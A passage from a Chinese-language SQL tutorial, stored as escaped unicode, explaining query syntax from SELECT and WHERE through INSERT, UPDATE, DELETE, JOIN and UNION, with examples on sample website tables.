\u8bed\u53e5\u7528\u4e8e\u4ece\u6570\u636e\u5e93\u4e2d\u9009\u53d6\u6570\u636e\uff0c\u7ed3\u679c\u88ab\u5b58\u50a8\u5728\u4e00\u4e2a\u7ed3\u679c\u8868\u4e2d\uff0c\u79f0\u4e3a\u7ed3\u679c\u96c6\uff1b \uff082\uff09\u8bed\u6cd5\u5982\u4e0b\uff1a SELECT column_name,column_name FROM table_name; SELECT * FROM table_name; \uff083\uff09SELECT DISTINCT \u8bed\u53e5\u7528\u4e8e\u8fd4\u56de\u552f\u4e00\u4e0d\u540c\u7684\u503c\uff1a SELECT DISTINCT column_name,column_name FROM table_name; \uff084\uff09SELECT TOP \u5b50\u53e5\u7528\u4e8e\u89c4\u5b9a\u8981\u8fd4\u56de\u7684\u8bb0\u5f55\u7684\u6570\u76ee\uff1a -- SQL Server / MS Access \u8bed\u6cd5 SELECT TOP number|percent column_name(s) FROM table_name; -- \u4f8b\u5982\uff0cSELECT TOP 50 PERCENT * FROM Websites; -- \u8fd4\u56de\u6700\u540e5\u884c\uff0cselect top 5 * from table order by id desc -- MySQL \u8bed\u6cd5 SELECT column_name(s) FROM table_name LIMIT number; -- Oracle \u8bed\u6cd5 SELECT column_name(s) FROM table_name WHERE ROWNUM <= number; \uff085\uff09SELECT INTO \u8bed\u53e5\u4ece\u4e00\u4e2a\u8868\u590d\u5236\u6570\u636e\uff0c\u7136\u540e\u628a\u6570\u636e\u63d2\u5165\u5230\u53e6\u4e00\u4e2a\u65b0\u8868\u4e2d\uff1b SELECT column_name(s) INTO newtable [IN externaldb] FROM table1; -- \u6837\u4f8b SELECT * INTO WebsitesBackup2016 FROM Websites; SELECT Websites.name, access_log.count, access_log.date INTO WebsitesBackup2016 FROM Websites LEFT JOIN access_log ON Websites.id=access_log.site_id; -- SELECT INTO\u8bed\u53e5\u53ef\u7528\u4e8e\u901a\u8fc7\u53e6\u4e00\u79cd\u6a21\u5f0f\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u7a7a\u8868\uff0c\u53ea\u9700\u8981\u6dfb\u52a0\u4fc3\u4f7f\u67e5\u8be2\u6ca1\u6709\u6570\u636e\u8fd4\u56de\u7684 WHERE \u5b50\u53e5\u5373\u53ef SELECT * INTO newtable FROM table1 WHERE 1=0; -- MySQL \u6570\u636e\u5e93\u4e0d\u652f\u6301 SELECT ... INTO \u8bed\u53e5\uff0c\u4f46\u652f\u6301 INSERT INTO ... SELECT 2\u3001WHERE \uff081\uff09WHERE \u5b50\u53e5\u7528\u4e8e\u63d0\u53d6\u90a3\u4e9b\u6ee1\u8db3\u6307\u5b9a\u6761\u4ef6\u7684\u8bb0\u5f55\uff1b \uff082\uff09\u8bed\u6cd5\u5982\u4e0b\uff1a SELECT column_name,column_name FROM table_name WHERE column_name operator value; -- \u4f8b\u5982\uff1aSELECT * FROM Websites WHERE country='CN'; -- SELECT * FROM Websites WHERE id=1; \uff083\uff09\u5bf9\u4e8e\u6587\u672c\u5b57\u6bb5\u4f7f\u7528\u5355\u5f15\u53f7\u4e14\u533a\u5206\u5927\u5c0f\u5199\uff0c\u5bf9\u4e8e\u6570\u503c\u5b57\u6bb5\u76f4\u63a5\u6570\u503c\u5373\u53ef\uff1b \uff084\uff09\u53ef\u4ee5\u4f7f\u7528\u7684\u8fd0\u7b97\u7b26\uff1a = \u7b49\u4e8e <> \u4e0d\u7b49\u4e8e > \u5927\u4e8e < \u5c0f\u4e8e >= \u5927\u4e8e\u7b49\u4e8e <= \u5c0f\u4e8e\u7b49\u4e8e BETWEEN(and) \u5728\u67d0\u4e2a\u8303\u56f4\u5185\uff0c\u4e14\u4e0b\u9650\u5728\u524d\u4e0a\u9650\u5728\u540e\uff0c\u5e76\u4e14\u5305\u542b\u4e0a\u4e0b\u9650\u503c LIKE \u641c\u7d22\u67d0\u79cd\u6a21\u5f0f IN \u6307\u5b9a\u9488\u5bf9\u67d0\u4e2a\u5217\u7684\u591a\u4e2a\u53ef\u80fd\u503c \uff085\uff09\u903b\u8f91\u8fd0\u7b97\u7b26\uff1a not and or \uff086\uff09\u7279\u6b8a\u6761\u4ef6\uff1a is null \uff087\uff09LIKE\u6a21\u7cca\u67e5\u8be2\uff1a % \u8868\u793a\u591a\u4e2a\u5b57\u503c\uff0c_ \u4e0b\u5212\u7ebf\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff1b M% : \u4e3a\u80fd\u914d\u7b26\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u8868\u793a\u7684\u610f\u601d\u4e3a\u6a21\u7cca\u67e5\u8be2\u4fe1\u606f\u4e3a M \u5f00\u5934\u7684\uff1b %M% : \u8868\u793a\u67e5\u8be2\u5305\u542bM\u7684\u6240\u6709\u5185\u5bb9\uff1b %M_ : \u8868\u793a\u67e5\u8be2\u4ee5M\u5728\u5012\u6570\u7b2c\u4e8c\u4f4d\u7684\u6240\u6709\u5185\u5bb9\uff1b -- \u4f8b\u5982\uff0cSELECT * FROM Websites WHERE name LIKE 'G%'; -- \u901a\u8fc7NOT\u5173\u952e\u8bcd\uff0c\u53ef\u4ee5\u9009\u53d6\u4e0d\u5339\u914d\u6a21\u5f0f\uff0c\u4f8b\u5982\uff0cSELECT * FROM Websites WHERE name NOT LIKE '%oo%'; -- \u8f6c\u4e49_\u548c%\u4f7f\u7528escape\uff0c\u4f8b\u5982\uff0cselect * from username where \u540d\u5b57 like '\u6bb5\\_%' escape '\\'; \uff088\uff09LIKE\u548cREGEXP LIKE\u80fd\u7528\u7684\u901a\u914d\u7b26\uff0c%\uff0c_\uff0c[charlist]\uff0c[^charlist]\u6216[!charlist]\uff1b \u4e0d\u8fc7\uff0cMySQL \u3001SQLite \u53ea\u652f\u6301 % \u548c _ \u901a\u914d\u7b26\uff0c\u4e0d\u652f\u6301 [^charlist] \u6216 [!charlist] \u901a\u914d\u7b26\uff1b MS Access \u652f\u6301\uff0c\u5fae\u8f6f office \u5bf9\u901a\u914d\u7b26\u4e00\u76f4\u652f\u6301\u826f\u597d\uff0c\u4f46\u5fae\u8f6f\u6709\u65f6\u5019\u7684\u901a\u914d\u7b26\u4e0d\u652f\u6301 %\uff0c\u800c\u662f *\uff0c\u5177\u4f53\u770b\u5bf9\u5e94\u8f6f\u4ef6\u8bf4\u660e\uff1b MySQL \u4e2d\u8981\u5b8c\u6210 [^charlist] \u6216 [!charlist] \u901a\u914d\u7b26\u7684\u67e5\u8be2\u6548\u679c\uff0c\u9700\u8981\u901a\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f\u6765\u5b8c\u6210\uff1b SQLite\u4e0d\u652f\u6301Regexp\u6b63\u5219\u65b9\u6cd5\uff1b MySQL \u4e2d\u4f7f\u7528 REGEXP \u6216 NOT REGEXP \u8fd0\u7b97\u7b26 (\u6216 RLIKE \u548c NOT RLIKE) \u6765\u64cd\u4f5c\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u7528\u6cd5\u540cLIKE\uff1b -- \u4f8b\u5982\uff0cSELECT * FROM Websites WHERE name REGEXP '^[A-H]'; \uff089\uff09WHERE \u5b50\u53e5\u5e76\u4e0d\u4e00\u5b9a\u5e26\u6bd4\u8f83\u8fd0\u7b97\u7b26\uff0c\u5f53\u4e0d\u5e26\u8fd0\u7b97\u7b26\u65f6\uff0c\u4f1a\u6267\u884c\u4e00\u4e2a\u9690\u5f0f\u8f6c\u6362\uff0c\u5f53 0 \u65f6\u8f6c\u5316\u4e3a false\uff0c1 \u8f6c\u5316\u4e3a true\uff1b SELECT studentNO FROM student WHERE 0; SELECT studentNO FROM student WHERE 1; \uff0810\uff09IN\u8bed\u6cd5\uff1a SELECT column_name(s) FROM table_name WHERE column_name IN (value1,value2,...); \uff0811\uff09BETWEEN\u8bed\u6cd5\uff1a SELECT column_name(s) FROM table_name WHERE column_name BETWEEN value1 AND value2; -- NOT BETWEEN\uff0c\u8868\u793a\u4e0d\u5728\u5176\u4e2d SELECT * FROM Websites WHERE alexa NOT BETWEEN 1 AND 20; -- \u5e26\u6709 IN \u7684 BETWEEN SELECT * FROM Websites WHERE (alexa BETWEEN 1 AND 20) AND country NOT IN ('USA', 'IND'); -- \u5e26\u6709\u6587\u672c\u503c\u7684 BETWEEN SELECT * FROM Websites WHERE name BETWEEN 'A' AND 'H'; -- \u9009\u53d6 name \u4ee5\u4ecb\u4e8e 'A' \u548c 'H' \u4e4b\u95f4\u5b57\u6bcd\u5f00\u59cb\u7684\u6240\u6709\u7f51\u7ad9 -- \u5e26\u6709\u6587\u672c\u503c\u7684 NOT BETWEEN SELECT * FROM Websites WHERE name NOT BETWEEN 'A' AND 'H'; -- \u5e26\u6709\u65e5\u671f\u503c\u7684 BETWEEN SELECT * FROM access_log WHERE date BETWEEN '2016-05-10' AND '2016-05-14'; -- \u9009\u53d6 date \u4ecb\u4e8e '2016-05-10' \u548c '2016-05-14' \u4e4b\u95f4\u7684\u6240\u6709\u8bbf\u95ee\u8bb0\u5f55 /*\u8bf7\u6ce8\u610f\uff0c\u5728\u4e0d\u540c\u7684\u6570\u636e\u5e93\u4e2d\uff0cBETWEEN \u64cd\u4f5c\u7b26\u4f1a\u4ea7\u751f\u4e0d\u540c\u7684\u7ed3\u679c\uff01 \u5728\u67d0\u4e9b\u6570\u636e\u5e93\u4e2d\uff0cBETWEEN \u9009\u53d6\u4ecb\u4e8e\u4e24\u4e2a\u503c\u4e4b\u95f4\u4f46\u4e0d\u5305\u62ec\u4e24\u4e2a\u6d4b\u8bd5\u503c\u7684\u5b57\u6bb5\u3002 \u5728\u67d0\u4e9b\u6570\u636e\u5e93\u4e2d\uff0cBETWEEN \u9009\u53d6\u4ecb\u4e8e\u4e24\u4e2a\u503c\u4e4b\u95f4\u4e14\u5305\u62ec\u4e24\u4e2a\u6d4b\u8bd5\u503c\u7684\u5b57\u6bb5\u3002 \u5728\u67d0\u4e9b\u6570\u636e\u5e93\u4e2d\uff0cBETWEEN \u9009\u53d6\u4ecb\u4e8e\u4e24\u4e2a\u503c\u4e4b\u95f4\u4e14\u5305\u62ec\u7b2c\u4e00\u4e2a\u6d4b\u8bd5\u503c\u4f46\u4e0d\u5305\u62ec\u6700\u540e\u4e00\u4e2a\u6d4b\u8bd5\u503c\u7684\u5b57\u6bb5\u3002 \u56e0\u6b64\uff0c\u8bf7\u68c0\u67e5\u60a8\u7684\u6570\u636e\u5e93\u662f\u5982\u4f55\u5904\u7406 BETWEEN \u64cd\u4f5c\u7b26\uff01*/ 3\u3001ORDER BY \uff081\uff09ORDER BY \u5173\u952e\u5b57\u7528\u4e8e\u5bf9\u7ed3\u679c\u96c6\u6309\u7167\u4e00\u4e2a\u5217\u6216\u8005\u591a\u4e2a\u5217\u8fdb\u884c\u6392\u5e8f\uff0c\u9ed8\u8ba4\u6309\u7167\u5347\u5e8f\u5bf9\u8bb0\u5f55\u8fdb\u884c\u6392\u5e8f\uff0c\u5982\u679c\u9700\u8981\u6309\u7167\u964d\u5e8f\u5bf9\u8bb0\u5f55\u8fdb\u884c\u6392\u5e8f\uff0c\u4f7f\u7528 DESC \u5173\u952e\u5b57\uff1b \uff082\uff09\u8bed\u6cd5\u5982\u4e0b\uff1a SELECT column_name,column_name FROM table_name ORDER BY column_name,column_name ASC|DESC; \uff083\uff09ORDER BY \u591a\u5217\u7684\u65f6\u5019\uff1a order by A,B \u8fd9\u4e2a\u65f6\u5019\u90fd\u662f\u9ed8\u8ba4\u6309\u5347\u5e8f\u6392\u5217 order by A desc,B \u8fd9\u4e2a\u65f6\u5019 A \u964d\u5e8f\uff0cB \u5347\u5e8f\u6392\u5217 order by A ,B desc \u8fd9\u4e2a\u65f6\u5019 A \u5347\u5e8f\uff0cB \u964d\u5e8f\u6392\u5217 4\u3001INSERT INTO \uff081\uff09INSERT INTO \u8bed\u53e5\u7528\u4e8e\u5411\u8868\u4e2d\u63d2\u5165\u65b0\u8bb0\u5f55\uff1b \uff082\uff09\u8bed\u6cd5\u5982\u4e0b\uff1a -- \u7b2c\u4e00\u79cd\u5f62\u5f0f\u65e0\u9700\u6307\u5b9a\u8981\u63d2\u5165\u6570\u636e\u7684\u5217\u540d\uff0c\u53ea\u9700\u63d0\u4f9b\u88ab\u63d2\u5165\u7684\u503c\u5373\u53ef INSERT INTO table_name VALUES (value1,value2,value3,...); -- \u7b2c\u4e8c\u79cd\u5f62\u5f0f\u9700\u8981\u6307\u5b9a\u5217\u540d\u53ca\u88ab\u63d2\u5165\u7684\u503c INSERT INTO table_name (column1,column2,column3,...) VALUES (value1,value2,value3,...); \uff083\uff09\u6ca1\u6709\u6307\u5b9a\u8981\u63d2\u5165\u6570\u636e\u7684\u5217\u540d\u7684\u5f62\u5f0f\u9700\u8981\u5217\u51fa\u63d2\u5165\u884c\u7684\u6bcf\u4e00\u5217\u6570\u636e\uff1b \uff084\uff09insert into select \u548cselect into from \u7684\u533a\u522b\uff0c\u524d\u8005\u91cd\u5728\u66f4\u65b0\u5df2\u5b58\u5728\u8868\u7684\u6570\u636e\uff0c\u540e\u8005\u91cd\u5728\u521b\u5efa\u65b0\u8868\uff1a insert into scorebak select * from socre where neza='neza' --\u63d2\u5165\u4e00\u884c,\u8981\u6c42\u8868scorebak \u5fc5\u987b\u5b58\u5728 select * into scorebak from score where neza='neza' --\u4e5f\u662f\u63d2\u5165\u4e00\u884c,\u8981\u6c42\u8868scorebak \u4e0d\u5b58\u5728 \uff085\uff09INSERT INTO SELECT \u8bed\u53e5\u4ece\u4e00\u4e2a\u8868\u590d\u5236\u6570\u636e\uff0c\u7136\u540e\u628a\u6570\u636e\u63d2\u5165\u5230\u4e00\u4e2a\u5df2\u5b58\u5728\u7684\u8868\u4e2d\uff0c\u76ee\u6807\u8868\u4e2d\u4efb\u4f55\u5df2\u5b58\u5728\u7684\u884c\u90fd\u4e0d\u4f1a\u53d7\u5f71\u54cd\uff1b INSERT INTO table2 (column_name(s)) SELECT column_name(s) FROM table1; -- \u6837\u4f8b INSERT INTO Websites (name, country) SELECT app_name, country FROM apps; 5\u3001UPDATE \uff081\uff09UPDATE \u8bed\u53e5\u7528\u4e8e\u66f4\u65b0\u8868\u4e2d\u5df2\u5b58\u5728\u7684\u8bb0\u5f55\uff1b \uff082\uff09\u8bed\u6cd5\u5982\u4e0b\uff1a UPDATE table_name SET column1=value1,column2=value2,... WHERE some_column=some_value; \uff083\uff09 \u8bf7\u6ce8\u610f SQL UPDATE \u8bed\u53e5\u4e2d\u7684 WHERE \u5b50\u53e5\uff01 WHERE \u5b50\u53e5\u89c4\u5b9a\u54ea\u6761\u8bb0\u5f55\u6216\u8005\u54ea\u4e9b\u8bb0\u5f55\u9700\u8981\u66f4\u65b0\u3002\u5982\u679c\u60a8\u7701\u7565\u4e86 WHERE \u5b50\u53e5\uff0c\u6240\u6709\u7684\u8bb0\u5f55\u90fd\u5c06\u88ab\u66f4\u65b0\uff01 \uff084\uff09\u5728 MySQL \u4e2d\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e sql_safe_updates \u8fd9\u4e2a\u81ea\u5e26\u7684\u53c2\u6570\u6765\u89e3\u51b3\uff0c\u5f53\u8be5\u53c2\u6570\u5f00\u542f\u7684\u60c5\u51b5\u4e0b\uff0c\u4f60\u5fc5\u987b\u5728update \u8bed\u53e5\u540e\u643a\u5e26 where \u6761\u4ef6\uff0c\u5426\u5219\u5c31\u4f1a\u62a5\u9519\uff0c set sql_safe_updates=1; \u8868\u793a\u5f00\u542f\u8be5\u53c2\u6570\uff1b 6\u3001DELETE \uff081\uff09DELETE \u8bed\u53e5\u7528\u4e8e\u5220\u9664\u8868\u4e2d\u7684\u884c\uff1b \uff082\uff09\u8bed\u6cd5\u5982\u4e0b\uff1a DELETE FROM table_name WHERE some_column=some_value; \uff083\uff09 \u8bf7\u6ce8\u610f SQL DELETE \u8bed\u53e5\u4e2d\u7684 WHERE \u5b50\u53e5\uff01 WHERE \u5b50\u53e5\u89c4\u5b9a\u54ea\u6761\u8bb0\u5f55\u6216\u8005\u54ea\u4e9b\u8bb0\u5f55\u9700\u8981\u5220\u9664\u3002\u5982\u679c\u60a8\u7701\u7565\u4e86 WHERE \u5b50\u53e5\uff0c\u6240\u6709\u7684\u8bb0\u5f55\u90fd\u5c06\u88ab\u5220\u9664\uff01 \uff084\uff09\u5220\u9664\u6240\u6709\u6570\u636e\uff0c\u8868\u7ed3\u6784\u3001\u5c5e\u6027\u3001\u7d22\u5f15\u5c06\u4fdd\u6301\u4e0d\u53d8\uff1a DELETE FROM table_name; DELETE * FROM table_name; \uff085\uff09\u4e09\u6761\u5220\u9664\u8bed\u53e5\u7684\u533a\u522b\uff1a DROP test; -- \u5220\u9664\u8868test\uff0c\u5e76\u91ca\u653e\u7a7a\u95f4\uff0c\u5c06test\u5220\u9664\u7684\u4e00\u5e72\u4e8c\u51c0 TRUNCATE test; -- \u5220\u9664\u8868test\u91cc\u7684\u5185\u5bb9\uff0c\u5e76\u91ca\u653e\u7a7a\u95f4\uff0c\u4f46\u4e0d\u5220\u9664\u8868\u7684\u5b9a\u4e49\uff0c\u8868\u7684\u7ed3\u6784\u8fd8\u5728 DELETE FROM table_name; -- \u4ec5\u5220\u9664\u8868test\u5185\u7684\u6240\u6709\u5185\u5bb9\uff0c\u4fdd\u7559\u8868\u7684\u5b9a\u4e49\uff0c\u4e0d\u91ca\u653e\u7a7a\u95f4 DELETE * FROM table_name; -- \u4ec5\u5220\u9664\u8868test\u5185\u7684\u6240\u6709\u5185\u5bb9\uff0c\u4fdd\u7559\u8868\u7684\u5b9a\u4e49\uff0c\u4e0d\u91ca\u653e\u7a7a\u95f4 -- \u4e5f\u5c31\u662fdelete\u5220\u9664\u7684\u6570\u636e\u53ef\u4ee5\u6062\u590d\uff0ctruncate\u548cdrop\u5220\u9664\u7684\u6570\u636e\u65e0\u6cd5\u6062\u590d \uff086\uff09\u5728 MySQL \u4e2d\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e sql_safe_updates \u8fd9\u4e2a\u81ea\u5e26\u7684\u53c2\u6570\u6765\u89e3\u51b3\uff0c\u5f53\u8be5\u53c2\u6570\u5f00\u542f\u7684\u60c5\u51b5\u4e0b\uff0c\u4f60\u5fc5\u987b\u5728delete \u8bed\u53e5\u540e\u643a\u5e26 where \u6761\u4ef6\uff0c\u5426\u5219\u5c31\u4f1a\u62a5\u9519\uff0c set sql_safe_updates=1; \u8868\u793a\u5f00\u542f\u8be5\u53c2\u6570\uff1b 7\u3001\u522b\u540d \uff081\uff09\u5217\u7684 SQL \u522b\u540d\u8bed\u6cd5\uff08\u5982\u679c\u5217\u540d\u79f0\u5305\u542b\u7a7a\u683c\uff0c\u8981\u6c42\u4f7f\u7528\u53cc\u5f15\u53f7\u6216\u65b9\u62ec\u53f7\uff09\uff1a SELECT column_name AS alias_name FROM table_name; -- \u6837\u4f8b SELECT name, CONCAT(url, ', ', alexa, ', ', country) AS site_info FROM Websites; -- \u628a\u4e09\u4e2a\u5217\uff08url\u3001alexa \u548c country\uff09\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u5e76\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a \"site_info\" \u7684\u522b\u540d \uff082\uff09\u8868\u7684 SQL \u522b\u540d\u8bed\u6cd5\uff1a SELECT column_name(s) FROM table_name AS alias_name; -- \u6837\u4f8b SELECT w.name, w.url, a.count, a.date FROM Websites AS w, access_log AS a WHERE a.site_id=w.id and w.name=\"\u83dc\u9e1f\u6559\u7a0b\"; \uff083\uff09\u5728\u4e0b\u5217\u60c5\u51b5\u4e2d\u4f7f\u7528\u522b\u540d\u5f88\u6709\u7528\uff1a \u5728\u67e5\u8be2\u4e2d\u6d89\u53ca\u8d85\u8fc7\u4e00\u4e2a\u8868 \u5728\u67e5\u8be2\u4e2d\u4f7f\u7528\u4e86\u51fd\u6570 \u5217\u540d\u79f0\u5f88\u957f\u6216\u8005\u53ef\u8bfb\u6027\u5dee \u9700\u8981\u628a\u4e24\u4e2a\u5217\u6216\u8005\u591a\u4e2a\u5217\u7ed3\u5408\u5728\u4e00\u8d77 8\u3001JOIN \uff081\uff09JOIN \u5b50\u53e5\u7528\u4e8e\u628a\u6765\u81ea\u4e24\u4e2a\u6216\u591a\u4e2a\u8868\u7684\u884c\u7ed3\u5408\u8d77\u6765\uff0c\u57fa\u4e8e\u8fd9\u4e9b\u8868\u4e4b\u95f4\u7684\u5171\u540c\u5b57\u6bb5\uff1b \uff082\uff09\u4e0d\u540c\u7684JOIN\u7c7b\u578b\uff1a INNER JOIN\uff1a\u5982\u679c\u8868\u4e2d\u6709\u81f3\u5c11\u4e00\u4e2a\u5339\u914d\uff0c\u5219\u8fd4\u56de\u884c LEFT JOIN\uff1a\u5373\u4f7f\u53f3\u8868\u4e2d\u6ca1\u6709\u5339\u914d\uff0c\u4e5f\u4ece\u5de6\u8868\u8fd4\u56de\u6240\u6709\u7684\u884c RIGHT JOIN\uff1a\u5373\u4f7f\u5de6\u8868\u4e2d\u6ca1\u6709\u5339\u914d\uff0c\u4e5f\u4ece\u53f3\u8868\u8fd4\u56de\u6240\u6709\u7684\u884c FULL OUTER JOIN\uff1a\u53ea\u8981\u5176\u4e2d\u4e00\u4e2a\u8868\u4e2d\u5b58\u5728\u5339\u914d\uff0c\u5219\u8fd4\u56de\u884c \uff083\uff09MySQL \u6682\u4e0d\u652f\u6301 FULL OUTER JOIN\uff0cMySQL\u5b9e\u73b0\u5b8c\u5168\u5916\u90e8\u94fe\u63a5\uff0c\u8981\u4f7f\u7528 UNION \u5c06\u4e00\u4e2a\u5de6\u94fe\u63a5\u3001\u548c\u4e00\u4e2a\u53f3\u94fe\u63a5\u53bb\u91cd\u5408\u5e76\uff1b SELECT a.*,b.* FROM \u88681 a LEFT JOIN \u88682 b ON a.unit_NO = b.unit_NO UNION SELECT a.*,b.* FROM \u88681 a RIGHT JOIN \u88682 b ON a.unit_NO = b.unit_NO; \uff084\uff09\u9996\u5148\uff0c\u8fde\u63a5\u7684\u7ed3\u679c\u53ef\u4ee5\u5728\u903b\u8f91\u4e0a\u770b\u4f5c\u662f\u7531SELECT\u8bed\u53e5\u6307\u5b9a\u7684\u5217\u7ec4\u6210\u7684\u65b0\u8868\uff0c\u5de6\u8fde\u63a5\u4e0e\u53f3\u8fde\u63a5\u7684\u5de6\u53f3\u6307\u7684\u662f\u4ee5\u4e24\u5f20\u8868\u4e2d\u7684\u54ea\u4e00\u5f20\u4e3a\u57fa\u51c6\uff0c\u5b83\u4eec\u90fd\u662f\u5916\u8fde\u63a5\uff1b \uff085\uff09\u5916\u8fde\u63a5\u5c31\u597d\u50cf\u662f\u4e3a\u975e\u57fa\u51c6\u8868\u6dfb\u52a0\u4e86\u4e00\u884c\u5168\u4e3a\u7a7a\u503c\u7684\u4e07\u80fd\u884c\uff0c\u7528\u6765\u4e0e\u57fa\u51c6\u8868\u4e2d\u627e\u4e0d\u5230\u5339\u914d\u7684\u884c\u8fdb\u884c\u5339\u914d\uff0c\u5047\u8bbe\u4e24\u4e2a\u6ca1\u6709\u7a7a\u503c\u7684\u8868\u8fdb\u884c\u5de6\u8fde\u63a5\uff0c\u5de6\u8868\u662f\u57fa\u51c6\u8868\uff0c\u5de6\u8868\u7684\u6240\u6709\u884c\u90fd\u51fa\u73b0\u5728\u7ed3\u679c\u4e2d\uff0c\u53f3\u8868\u5219\u53ef\u80fd\u56e0\u4e3a\u65e0\u6cd5\u4e0e\u57fa\u51c6\u8868\u5339\u914d\u800c\u51fa\u73b0\u662f\u7a7a\u503c\u7684\u5b57\u6bb5\uff1b \uff086\uff09INNER JOIN \u8bed\u6cd5\uff0c\u5728\u8868\u4e2d\u5b58\u5728\u81f3\u5c11\u4e00\u4e2a\u5339\u914d\u65f6\u8fd4\u56de\u884c\uff1a SELECT column_name(s) FROM table1 INNER JOIN table2 ON table1.column_name=table2.column_name; -- \u6216\uff0cINNER JOIN \u4e0e JOIN \u662f\u76f8\u540c\u7684 SELECT column_name(s) FROM table1 JOIN table2 ON table1.column_name=table2.column_name; \uff087\uff09LEFT JOIN \u5173\u952e\u5b57\u4ece\u5de6\u8868\uff08table1\uff09\u8fd4\u56de\u6240\u6709\u7684\u884c\uff0c\u5373\u4f7f\u53f3\u8868\uff08table2\uff09\u4e2d\u6ca1\u6709\u5339\u914d\u3002\u5982\u679c\u53f3\u8868\u4e2d\u6ca1\u6709\u5339\u914d\uff0c\u5219\u7ed3\u679c\u4e3a NULL\uff1b SELECT column_name(s) FROM table1 LEFT JOIN table2 ON table1.column_name=table2.column_name; -- \u6216\uff0c\u5728\u67d0\u4e9b\u6570\u636e\u5e93\u4e2d\uff0cLEFT JOIN \u79f0\u4e3a LEFT OUTER JOIN SELECT column_name(s) FROM table1 LEFT OUTER JOIN table2 ON table1.column_name=table2.column_name; \uff088\uff09RIGHT JOIN \u5173\u952e\u5b57\u4ece\u53f3\u8868\uff08table2\uff09\u8fd4\u56de\u6240\u6709\u7684\u884c\uff0c\u5373\u4f7f\u5de6\u8868\uff08table1\uff09\u4e2d\u6ca1\u6709\u5339\u914d\u3002\u5982\u679c\u5de6\u8868\u4e2d\u6ca1\u6709\u5339\u914d\uff0c\u5219\u7ed3\u679c\u4e3a NULL\uff1b SELECT column_name(s) FROM table1 RIGHT JOIN table2 ON table1.column_name=table2.column_name; -- \u6216\uff0c\u5728\u67d0\u4e9b\u6570\u636e\u5e93\u4e2d\uff0cRIGHT JOIN \u79f0\u4e3a RIGHT OUTER JOIN SELECT column_name(s) FROM table1 RIGHT OUTER JOIN table2 ON table1.column_name=table2.column_name; \uff089\uff09FULL OUTER JOIN \u5173\u952e\u5b57\u53ea\u8981\u5de6\u8868\uff08table1\uff09\u548c\u53f3\u8868\uff08table2\uff09\u5176\u4e2d\u4e00\u4e2a\u8868\u4e2d\u5b58\u5728\u5339\u914d\uff0c\u5219\u8fd4\u56de\u884c\uff1b SELECT column_name(s) FROM table1 FULL OUTER JOIN table2 ON table1.column_name=table2.column_name; \uff0810\uff09\u7b80\u5355\u8bb0\u6cd5\uff1a A inner join B \u53d6\u4ea4\u96c6\u3002 A left join B \u53d6 A \u5168\u90e8\uff0cB \u6ca1\u6709\u5bf9\u5e94\u7684\u503c\u4e3a null\u3002 A right join B \u53d6 B \u5168\u90e8 A \u6ca1\u6709\u5bf9\u5e94\u7684\u503c\u4e3a null\u3002 A full outer join B \u53d6\u5e76\u96c6\uff0c\u5f7c\u6b64\u6ca1\u6709\u5bf9\u5e94\u7684\u503c\u4e3a null\u3002 \u5bf9\u5e94\u6761\u4ef6\u5728 on \u540e\u9762\u586b\u5199\u3002 \uff0811\uff09ON\u7528\u6cd5\uff1a \u6570\u636e\u5e93\u5728\u901a\u8fc7\u8fde\u63a5\u4e24\u5f20\u6216\u591a\u5f20\u8868\u6765\u8fd4\u56de\u8bb0\u5f55\u65f6\uff0c\u90fd\u4f1a\u751f\u6210\u4e00\u5f20\u4e2d\u95f4\u7684\u4e34\u65f6\u8868\uff0c\u7136\u540e\u518d\u5c06\u8fd9\u5f20\u4e34\u65f6\u8868\u8fd4\u56de\u7ed9\u7528\u6237\uff1b on \u6761\u4ef6\u662f\u5728\u751f\u6210\u4e34\u65f6\u8868\u65f6\u4f7f\u7528\u7684\u6761\u4ef6\uff0c\u5b83\u4e0d\u7ba1 on \u4e2d\u7684\u6761\u4ef6\u662f\u5426\u4e3a\u771f\uff0c\u90fd\u4f1a\u8fd4\u56de\u8868\u4e2d\u7684\u8bb0\u5f55\uff1b where \u6761\u4ef6\u662f\u5728\u4e34\u65f6\u8868\u751f\u6210\u597d\u540e\uff0c\u518d\u5bf9\u4e34\u65f6\u8868\u8fdb\u884c\u8fc7\u6ee4\u7684\u6761\u4ef6\uff1b 9\u3001UNION \uff081\uff09UNION \u64cd\u4f5c\u7b26\u5408\u5e76\u4e24\u4e2a\u6216\u591a\u4e2a SELECT \u8bed\u53e5\u7684\u7ed3\u679c\uff1b \uff082\uff09\u8bf7\u6ce8\u610f\uff0cUNION \u5185\u90e8\u7684\u6bcf\u4e2a SELECT \u8bed\u53e5\u5fc5\u987b\u62e5\u6709\u76f8\u540c\u6570\u91cf\u7684\u5217\uff0c\u5217\u4e5f\u5fc5\u987b\u62e5\u6709\u76f8\u4f3c\u7684\u6570\u636e\u7c7b\u578b\uff0c\u540c\u65f6\uff0c\u6bcf\u4e2a SELECT \u8bed\u53e5\u4e2d\u7684\u5217\u7684\u987a\u5e8f\u5fc5\u987b\u76f8\u540c\uff0cUNION \u7ed3\u679c\u96c6\u4e2d\u7684\u5217\u540d\u603b\u662f\u7b49\u4e8e UNION \u4e2d\u7b2c\u4e00\u4e2a SELECT \u8bed\u53e5\u4e2d\u7684\u5217\u540d\uff1b \uff083\uff09SQL UNION \u8bed\u6cd5\uff1a SELECT column_name(s) FROM table1 UNION SELECT column_name(s) FROM table2; \uff084\uff09\u9ed8\u8ba4\u5730\uff0cUNION \u64cd\u4f5c\u7b26\u9009\u53d6\u4e0d\u540c\u7684\u503c\u3002\u5982\u679c\u5141\u8bb8\u91cd\u590d\u7684\u503c\uff0c\u8bf7\u4f7f\u7528 UNION ALL\uff1b SELECT column_name(s) FROM table1 UNION ALL SELECT column_name(s) FROM table2; \uff085\uff09\u4f7f\u7528UNION\u547d\u4ee4\u65f6\u9700\u8981\u6ce8\u610f\uff0c\u53ea\u80fd\u5728\u6700\u540e\u4f7f\u7528\u4e00\u4e2aORDER 